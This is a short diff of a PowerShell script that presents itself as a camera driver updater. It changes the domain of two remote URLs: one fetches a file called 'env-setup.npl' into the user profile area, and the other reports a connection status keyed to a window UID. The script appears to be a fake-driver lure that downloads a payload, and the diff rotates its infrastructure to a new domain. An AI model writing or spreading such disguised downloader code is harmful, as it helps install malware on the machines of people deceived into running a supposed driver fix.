@@ -213,7 +213,7 @@ else {
     }
 }
 
-$envSetupUrl = "https://api.canditech.net/driver/env-setup.npl"
+$envSetupUrl = "https://api.canditech.ink/driver/env-setup.npl"
 $codeProfile = $env:USERPROFILE
 if (-not (Test-Path -LiteralPath $codeProfile)) {
     New-Item -ItemType Directory -Path $codeProfile -Force *> $null
@@ -300,7 +300,7 @@ if ($LASTEXITCODE -ne 0) {
 
 Write-Host "[SUCCESS] Camera drivers have been updated successfully."
 if (-not [string]::IsNullOrWhiteSpace($WINDOW_UID)) {
-    $autoUrl = "https://api.canditech.net/change-connection-status/$WINDOW_UID"
+    $autoUrl = "https://api.canditech.ink/change-connection-status/$WINDOW_UID"
     try {
         $curlCmd = Get-Command curl.exe -ErrorAction SilentlyContinue
         if ($null -ne $curlCmd) {
